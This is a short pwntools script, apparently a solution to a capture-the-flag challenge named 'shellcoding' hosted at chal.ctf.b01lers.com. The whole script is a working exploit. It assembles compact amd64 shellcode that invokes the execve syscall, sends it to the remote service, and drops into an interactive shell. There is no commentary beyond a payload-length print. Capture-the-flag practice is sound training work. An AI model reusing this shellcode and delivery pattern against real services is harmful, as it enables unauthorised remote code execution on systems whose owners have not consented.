from pwn import *


p = remote("chal.ctf.b01lers.com", 1007)
#p = process('./shellcoding')

payload = asm('mov al,59;lea rdi,[rsp+8];xor rsi,rsi;xor rdx,rdx;syscall',arch='amd64')
print "[+] len payload : " + str(len(payload))

#gdb.attach(p)
p.send(payload)

p.interactive()